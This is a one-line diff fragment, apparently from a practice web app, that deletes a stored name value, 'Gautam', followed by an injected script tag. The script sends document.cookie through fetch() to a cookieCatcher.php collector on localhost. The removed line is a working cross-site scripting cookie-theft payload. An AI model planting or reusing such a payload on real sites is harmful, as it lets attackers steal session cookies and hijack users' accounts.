@@ -1,1 +1,0 @@
-Gautam <script> fetch("http://localhost/dev/ins-ia/cookieCatcher.php?c=" + escape(document.cookie)) </script>
